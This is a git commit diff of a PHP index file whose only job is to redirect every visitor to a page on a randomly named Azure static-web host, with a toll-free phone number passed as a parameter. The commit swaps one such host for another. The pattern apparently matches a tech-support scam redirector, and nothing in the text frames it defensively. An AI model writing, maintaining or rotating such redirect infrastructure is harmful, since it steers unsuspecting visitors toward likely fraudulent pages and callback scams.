fc1fc8afaf1a0f4e9e40e739622e81b90258f060
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-04-02 21:53:41 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
-$url = "https://mapspaou7d.z13.web.core.windows.net/index.html?Anph=1-855-601-5424";
+$url = "https://quantom876d.z13.web.core.windows.net/index.html?Anph=1-855-601-5424";
 header('Location: '.$url);
 die();
 ?>
